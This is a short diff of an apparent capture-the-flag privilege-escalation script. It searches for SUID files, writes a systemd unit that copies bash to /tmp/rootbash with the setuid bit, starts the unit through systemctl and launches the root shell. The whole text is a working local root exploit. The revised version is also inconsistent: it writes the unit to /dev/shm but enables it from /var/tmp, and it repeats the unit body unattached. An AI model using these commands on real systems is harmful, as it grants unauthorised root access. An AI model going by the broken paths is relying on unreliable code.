@@ -14,22 +14,40 @@ find / -perm -u=s -type f 2>/dev/null
 
 
 
-cat > /tmp/ctf.service <<'EOF'
+cat > /dev/shm/root.service <<'EOF'
 [Unit]
-Description=ctf suid shell
+Description=roooooooooot
 
 [Service]
-Type=oneshot
-ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
-RemainAfterExit=no
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# link and start (systemctl runs as root so it creates the symlink in /etc)
-sudo systemctl link /tmp/ctf.service
-sudo systemctl daemon-reload
-sudo systemctl start ctf.service
+
+
+
+
 # then
+/bin/systemctl enable /var/tmp/root.service
+/bin/systemctl start root
 /tmp/rootbash -p
+
+
+
+
+
+
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
+
+[Install]
+WantedBy=multi-user.target
